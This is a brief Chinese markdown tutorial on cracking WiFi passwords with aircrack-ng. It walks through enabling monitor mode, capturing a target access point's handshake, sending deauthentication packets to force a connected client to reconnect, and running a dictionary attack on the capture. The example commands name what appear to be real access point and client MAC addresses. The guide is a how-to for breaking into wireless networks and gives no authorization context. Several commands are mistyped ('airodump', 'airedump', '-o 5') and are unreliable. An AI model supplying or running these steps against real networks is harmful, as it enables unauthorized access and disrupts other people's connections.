# WIFI 密码爆破

使用aircrack-ng套件,实现这一目的.

## airmon-ng

用于查看可用网卡,还可将驱动支持监听模式的网卡启动.
- 查看可用的网卡 ```sudo airmon-ng ```

- 启动监听模式 ```sudo airmon-ng start wlan0```

## airodump-ng

用于发现现在工作中的AP,并捕捉其报文.

常用命令
- 先发现工作ap, ```sudo airodump wlan0```
- 查看发现的AP中,data数量较大的,至少不为0,记住其bssid和频道,例如bssid为 aa:bb:cc:dd:ee:ff,频道为9
- 设置过滤条件专项抓取握手包 ```sudo airedump --ivs -c 9 -w ~\Documents\mycapture  --bssid aa:bb:cc:dd:ee:ff wlan0```

```
#example

leo@kali:~$ sudo airodump-ng --manufacturer -w ~/Documents/aps wlan1       


sudo airodump-ng --ivs -w ~/Documents/912 --bssid 50:FA:84:63:96:4C  -c 13  wlan1  
```
## aireplay-ng

等待握手包是费时间的.所以考虑采用deauth攻击,使其重连.aireplay可以进行多种攻击,所以完全胜任此项工作.

假设在使用airedump定向抓取中,发现某个与AP连接的client 其mac为: a1:b1:c1:d1:e1:f1
- 在使用airedump定向抓取后,新开终端执行命令 ```sudo aireplay -o 5 --bssid aa:bb:cc:dd:ee:ff -d a1:b1:c1:d1:e1:f1```.这个命令可以发送5次deauth攻击.



```
leo@kali:~$ sudo aireplay-ng -0 5 -a 50:FA:84:63:96:4C  -c ac:04:81:d2:65:8c  wlan1
```

## aircrack-ng

```sudo aircrack-ng -a 2 -w 字典文件 **.cap```